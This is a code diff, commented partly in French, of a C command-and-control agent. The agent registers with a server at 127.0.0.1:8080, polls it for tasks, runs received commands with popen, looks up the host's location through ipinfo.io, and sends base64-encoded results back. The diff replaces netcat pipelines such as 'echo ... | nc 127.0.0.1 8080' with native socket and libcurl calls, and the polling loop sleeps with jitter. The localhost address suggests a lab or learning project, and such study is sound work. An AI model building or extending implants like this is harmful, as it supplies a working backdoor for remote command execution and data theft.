@@ -3,22 +3,84 @@
 #include <string.h>
 #include <unistd.h>
 #include <time.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <curl/curl.h>
 #include "base64.h"
+
+#define SERVER_IP "127.0.0.1"
+#define SERVER_PORT 8080
+#define BUFFER_SIZE 4096
 
 char uid[64];
 double sleep_time = 5;
 double jitter = 0.0;
 
-void get_uid() {
-    FILE *fp;
-    char result[1024];
+// Nouvelle fonction pour créer une connexion socket au serveur
+int connect_to_server() {
+    int sockfd;
+    struct sockaddr_in servaddr;
     
-    fp = popen("echo 'DECLARE,client,linux,terminal' | nc 127.0.0.1 8080", "r");
-    fgets(result, sizeof(result), fp);
-    pclose(fp);
+    // Création du socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    
+    // Configuration de l'adresse du serveur
+    memset(&servaddr, 0, sizeof(servaddr));
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_port = htons(SERVER_PORT);
+    servaddr.sin_addr.s_addr = inet_addr(SERVER_IP);
+    
+    // Connexion au serveur
+    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0) {
+        perror("Erreur lors de la connexion au serveur");
+        close(sockfd);
+        return -1;
+    }
+    
+    return sockfd;
+}
+
+// Fonction pour envoyer une commande au serveur et récupérer la réponse
+int send_command_and_get_response(const char *command, char *response, size_t response_size) {
+    int sockfd = connect_to_server();
+    if (sockfd < 0) {
+        return -1;
+    }
+    
+    // Envoi de la commande
+    if (send(sockfd, command, strlen(command), 0) < 0) {
+        perror("Erreur lors de l'envoi de la commande");
+        close(sockfd);
+        return -1;
+    }
+    
+    // Réception de la réponse
+    int bytes_received = recv(sockfd, response, response_size - 1, 0);
+    if (bytes_received < 0) {
+        perror("Erreur lors de la réception de la réponse");
+        close(sockfd);
+        return -1;
+    }
+    
+    // Ajout de la terminaison de chaîne
+    response[bytes_received] = '\0';
+    
+    close(sockfd);
+    return 0;
+}
+
+void get_uid() {
+    char command[128] = "DECLARE,client,linux,terminal\n";
+    char response[1024] = {0};
+    
+    if (send_command_and_get_response(command, response, sizeof(response)) < 0) {
+        fprintf(stderr, "Erreur lors de la déclaration du client\n");
+        return;
+    }
     
     // expected format: "Ok, ad8895843b")
-    strtok(result, ",");         // ignore the first field
+    strtok(response, ",");         // ignore the first field
     char *id = strtok(NULL, ",");
     
     // Trim trailing whitespace and newlines
@@ -66,25 +128,24 @@ void task_execve(char *command_str, char *argument_str, const char *id_task) {
     while (fgets(buffer, sizeof(buffer), fp) != NULL) {
         strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
     }
+    pclose(fp);
     
     // Send the result back to the server
     if (strlen(result_buffer) > 0) {
         // encoding and sending the result
         char *encoded_result = encode(result_buffer);
-        char cmd[2048];
-        printf("Sending result: echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080\n", uid, id_task, encoded_result);
-        
-        snprintf(cmd, sizeof(cmd), "echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080", uid, id_task, encoded_result);
-        
-        // execution and capture the response
+        char cmd[BUFFER_SIZE];
         char response[1024] = {0};
-        FILE *cmd_fp = popen(cmd, "r");
-        if (cmd_fp != NULL) {
-            fgets(response, sizeof(response), cmd_fp);
-            pclose(cmd_fp);
-            printf("Server response: %s\n", response);
+        
+        // Format de commande : "RESULT,uid,id_task,encoded_result"
+        snprintf(cmd, sizeof(cmd), "RESULT,%s,%s,%s\n", uid, id_task, encoded_result);
+        printf("Sending result: %s\n", cmd);
+        
+        // Envoi via socket
+        if (send_command_and_get_response(cmd, response, sizeof(response)) < 0) {
+            fprintf(stderr, "Erreur lors de l'envoi du résultat\n");
         } else {
-            perror("Error sending the result");
+            printf("Server response: %s\n", response);
         }
         
         free(encoded_result);
@@ -131,51 +192,62 @@ void calculate_random_sleep_time() {
     sleep_time = time_1 + random_factor * (time_2 - time_1);
 }
 
+// Fonction de callback pour libcurl
+size_t write_callback(char *ptr, size_t size, size_t nmemb, void *userdata) {
+    strcat((char*)userdata, ptr);
+    return size * nmemb;
+}
+
 void task_locate(const char *id_task) {
     printf("Executing task locate\n");
-
-    char result_buffer[4096];
-    memset(result_buffer, 0, sizeof(result_buffer));
-
-    // get localisation info with ipinfo.io
-    FILE *fp = popen("curl -s ipinfo.io", "r");
-    if (fp == NULL) {
-        perror("Error executing curl");
+    
+    char result_buffer[4096] = {0};
+    
+    // Initialisation de curl
+    CURL *curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Erreur d'initialisation de curl\n");
         return;
     }
-
-    char buffer[1024];
-    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
-        strcat(result_buffer, buffer);
+    
+    // Configuration de la requête
+    curl_easy_setopt(curl, CURLOPT_URL, "https://ipinfo.io");
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, result_buffer);
+    
+    // Exécution de la requête
+    CURLcode res = curl_easy_perform(curl);
+    
+    // Nettoyage
+    curl_easy_cleanup(curl);
+    
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Erreur curl: %s\n", curl_easy_strerror(res));
+        return;
     }
-    pclose(fp);
-
+    
+    // Encodage et envoi du résultat
     char *encoded_result = encode(result_buffer);
     if (encoded_result == NULL) {
         printf("Error encoding to base64\n");
         return;
     }
-
-    // building and executing the command
-    // expected format : "RESULT,uid,id_task,encoded_result")
-    char cmd[2048];
-    printf("command executed : echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080\n", uid, id_task, encoded_result);
     
-    // Ensure proper command formatting with cleaned UID
-    snprintf(cmd, sizeof(cmd), "echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080", uid, id_task, encoded_result);
-    
-    // Execute and capture the response
+    // Format de la commande : "RESULT,uid,id_task,encoded_result"
+    char cmd[BUFFER_SIZE];
     char response[1024] = {0};
-    FILE *cmd_fp = popen(cmd, "r");
-    if (cmd_fp != NULL) {
-        fgets(response, sizeof(response), cmd_fp);
-        pclose(cmd_fp);
-        printf("Server response: %s\n", response);
+    
+    snprintf(cmd, sizeof(cmd), "RESULT,%s,%s,%s\n", uid, id_task, encoded_result);
+    printf("Command to send: %s\n", cmd);
+    
+    // Envoi via socket
+    if (send_command_and_get_response(cmd, response, sizeof(response)) < 0) {
+        fprintf(stderr, "Erreur lors de l'envoi du résultat de localisation\n");
     } else {
-        perror("Error sending the result");
+        printf("Server response: %s\n", response);
     }
-
-    // free memory
+    
+    // Libération de la mémoire
     free(encoded_result);
 }
 
@@ -219,26 +291,18 @@ void task_netstat() {
     return;
 }
 
-void execute_server_command(const char *command, char *result, size_t result_size) {
-    FILE *fp = popen(command, "r");
-    if (fp == NULL) {
-        perror("Error executing the command");
-        result[0] = '\0';
+void check_commands() {
+    char cmd[128];
+    char result[1024] = {0};
+    
+    // Format de la commande : "FETCH,uid"
+    snprintf(cmd, sizeof(cmd), "FETCH,%s\n", uid);
+    
+    // Envoi via socket
+    if (send_command_and_get_response(cmd, result, sizeof(result)) < 0) {
+        fprintf(stderr, "Erreur lors de la récupération des commandes\n");
         return;
     }
-    if (fgets(result, result_size, fp) == NULL) {
-        perror("Error reading the response");
-        result[0] = '\0';
-    }
-    pclose(fp);
-}
-
-void check_commands() {
-    char cmd[256];
-    char result[1024];
-    
-    sprintf(cmd, "echo 'FETCH,%s' | nc 127.0.0.1 8080", uid);
-    execute_server_command(cmd, result, sizeof(result));
     
     printf("Server response: %s\n", result);
     
@@ -291,6 +355,9 @@ int main() {
     // Initialize the decoding table
     build_decoding_table();
     
+    // Initialize curl at program start
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    
     // step 1 : get uid
     get_uid();
     
@@ -305,6 +372,9 @@ int main() {
         printf("Pause of %.2f seconds\n", sleep_time);
         sleep(sleep_time);
     }
+    
+    // Clean up curl resources
+    curl_global_cleanup();
     
     // cleaning
     base64_cleanup();
